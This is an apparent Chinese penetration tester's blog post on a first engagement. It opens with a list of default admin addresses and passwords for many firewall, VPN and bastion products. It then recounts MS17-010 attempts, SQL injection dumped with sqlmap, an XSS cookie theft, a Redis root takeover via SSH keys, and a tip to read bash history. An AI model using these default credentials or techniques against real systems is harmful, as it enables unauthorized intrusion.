网上大佬收集的，分享给大家天融信防火墙，不需要证书 登录地址:https://192.168.1.254 用户名:superman 密码:talent 技术支持热线：8008105119天融信防火墙，不需要证书 登录地址:https://192.168.1.254：8080 用户名:superman 密码:talent！23 遇到设备需要把旧设备配置备份下来，再倒入新设备基于console口登陆，用户名，密码跟web界面一致 system config reset 清除配置 save 保存 联想网御防火墙，需要证书（最好用IE浏览器登录） 登录地址:https://10.1.5.254:8889 用户名:admin 密码:leadsec@7766、administrator、bane@7766 技术支持热线：4008107766 010-56632666深信服防火墙（注安全设备管理地址不是唯一的） https://10.251.251.251https://10.254.254.254 用户名：admin 密码：admin 技术支持热线：4006306430启明星辰 https://10.1.5.254:8889 用户名：admin 密码：bane@7766https://10.50.10.45:8889 用户名：admin 密码：admin@123 电脑端IP：10.50.10.44/255.255.255.0 技术支持热线：4006243900juniper 登录地址:https://192.168.1.1 用户名:netscreen 密码:netscreenCisco 登录地址:https://192.168.0.1 用户名:admin 密码:ciscoHuawei 登录地址:http://192.168.0.1 用户名:admin 密码:Admin@123H3C 登录地址:http://192.168.0.1 用户名:admin 密码:admin 技术支持热线：4006306430绿盟IPS https://192.168.1.101 用户名: weboper 密码: weboper 配置重启生效网神防火墙GE1口 https://10.50.10.45 用户名：admin 密码：firewall 技术支持热线：4006108220深信服VPN： 51111端口 delanrecover华为VPN：账号：root 密码：mduadmin华为防火墙： admin Admin@123 eudemoneudemon Juniper防火墙： netscreen netscreen迪普 192.168.0.1 默认的用户名和密码（admin/admin_default)山石 192.168.1.1 默认的管理账号为hillstone，密码为hillstone安恒的明御防火墙 admin/adminadmin某堡垒机 shterm/shterm天融信的vpn test/123456 MS17-010能验证但是反弹不了会话永恒之蓝这种东西之前跟着网上的复现过…网上复现文章通常也是在C段然后MSF一把梭… 所以真正当我遇到这个漏洞的时候，用 验证模块（use auxiliary/scanner/smb/smb_ms17_010）验证成功之后就以为成功了，但是利用攻击模块却并不能反弹会话 然后去了t00ls发了一篇求助帖 [【求神问卜】] 求问关于内网中ms17-010的利用 下面的回答都很大程度上帮助到了我… 03使用永恒浪漫攻击，不要使用永恒之蓝，没用。请使用原版，不要用msf的。 然后我了解了一下永恒之蓝的历史，和 NSA 原版攻击工具 具体可看一下我转载的博客 Shadow Brokers - From git clone to Pwned 还有网上一个大师傅的复现真的非常详细（膜orz）永恒之蓝、永恒浪漫、永恒冠军复现 很可惜的是因为一些时间的原因最后也没能成功利用，很多时候跟漏洞都是一个擦肩而过的距离 真的没办法进行sql注入了吗？这个点给我的感触蛮深的，学sql注入的时候知道sql注入发生的点是： 增 删 改 查，一切与数据库交互的地方都有可能进行sql注入 但是真正实际操作的时候满脑子都是登录框的用户名密码，甚至为了追求速度，养成了指定参数这种不好的习惯，所以连着很久都没有挖出sql注入 最后由于网站的特殊性，该网站忘记密码界面需要提供注册界面的手机号（emm不方便截图…），最后在POST包里面的一个不显眼的参数存在sql注入… 给的体会就是渗透过程中千万不要偷懒，所有get，post的参数凡是你觉得能够和数据库进行交互的，能手测就手测，不能手测就用sqlmap跑 细心一点，每个地方都测试一下 利用了sqlmap最终跑出用户名密码… 还有一点小感悟是 XFF 头注入是真的存在，渗透测试本身的过程就是把不可能的事变为可能，虽然我之前也一直觉得讲 XFF 头的注入是为了绕过gpc的过滤，需要很巧合才能完成，但是在测试一个办公系统的时候，开发跟我说到他们需要记录一下每个人登录的IP。所以为什么构成这种漏洞也就不奇怪了 cookie也敢明文传输用户名密码？这个也是真的第一次遇到，教科书般的漏洞… 首先用弱密码进入了网站（手动滑稽） 然后在测试其他漏洞的时候突然发现cookie使用明文传输了用户名密码 第一个想到的当然是XSS，XSS如果能够打到cookie那么将会是很严重的问题… 找了一下午XSS，终于在一个参数那寻找到了一个反射型XSS，且没有设置httponly，最后成功打到了经过base64位加密的用户名密码 Redis未授权访问Redis因配置不当可以导致未授权访问，被攻击者恶意利用。当前流行的针对Redis未授权访问的一种新型攻击方式，在特定条件下，如果Redis以root身份运行，黑客可以给root账户写入SSH公钥文件，直接通过SSH登录受害服务器，可导致服务器权限被获取和数据删除、泄露或加密勒索事件发生，严重危害业务正常服务。　　部分服务器上的Redis 绑定在 0.0.0.0:6379，并且没有开启认证（这是Redis 的默认配置） 这个真的蛮多公司都存在，没有接触过的老哥建议补充一下… Freebuf上有篇文章写得很详细… Redis未授权访问详解 一把梭进去还是 root 权限… 由于全是敏感数据就不贴图了 各种中间件的漏洞各种中间件的漏洞的话在各大论坛都有很详细的文章，大家可以自行查阅 一点小感悟就是，很多公司用的版本真的很老很老，而且几乎不打补丁…虽然可能有的时候 IIS ，Nginx那些解析漏洞没办法使用(真的挺难遇到上传点的)…但是如果看到老一点版本的 JBoss 、 weblogic 就可以利用很多工具了 以下提供一些好用的工具 Java反序列化集成工具 【技术分享】Java RMI 反序列化漏洞检测工具的编写 WeblogicScan 写在最后渗透测试中，工具，经验，还有灵活的思维都是很重要的东西（虽然自己一样也没有）… 有的时候连上了shell之后，然后如同机器人一般的反弹shell，执行 whoami，发现权限不够就进一步查看系统信息，接着尝试各种提权的操作。其实可能有的时候这些操作没有必要，可能最终的目标都是拿到一些信息或者数据。所以根据实际情况判断一下是否需要提权，是一个提高效率不错的办法。 此外，一个 cat ~/.bash_history 命令有时候可能会给你带来一些惊喜 最后，根据信安之路的史上最强内网渗透知识点总结,补充了里面的一点东西。分享给大家 内网渗透之常用命令小结 本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。","link":"/2019/08/26/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%9A%84%E5%88%86%E4%BA%AB%E5%92%8C%E5%B0%8F%E7%BB%93/"}],"tags":[{"name":"随笔","slug":"随笔","link":"/tags/%E9%9A%8F%E7%AC%94/"},{"name":"PHP","slug":"PHP","link":"/tags/PHP/"},{"name":"Node.js","slug":"Node-js","link":"/tags/Node-js/"},{"name":"Java","slug":"Java","link":"/tags/Java/"},{"name":"Python","slug":"Python","link":"/tags/Python/"},{"name":"JavaScript","slug":"JavaScript","link":"/tags/JavaScript/"},{"name":"漏洞分析","slug":"漏洞分析","link":"/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"},{"name":"XSS","slug":"XSS","link":"/tags/XSS/"},{"name":"反序列化","slug":"反序列化","link":"/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"PHPCMS","slug":"PHPCMS","link":"/tags/PHPCMS/"},{"name":"代码审计","slug":"代码审计","link":"/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"name":"Typecho","slug":"Typecho","link":"/tags/Typecho/"},{"name":"CTF","slug":"CTF","link":"/tags/CTF/"},{"name":"漏洞挖掘","slug":"漏洞挖掘","link":"/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"},{"name":"渗透测试","slug":"渗透测试","link":"/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"categories":[{"name":"随笔","slug":"随笔","link":"/categories/%E9%9A%8F%E7%AC%94/"},{"name":"Web安全","slug":"Web安全","link":"/categories/Web%E5%AE%89%E5%85%A8/"},{"name":"漏洞分析","slug":"漏洞分析","link":"/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"},{"name":"CTF","slug":"CTF","link":"/categories/CTF/"},{"name":"漏洞挖掘","slug":"漏洞挖掘","link":"/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"},{"name":"渗透测试","slug":"渗透测试","link":"/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}]}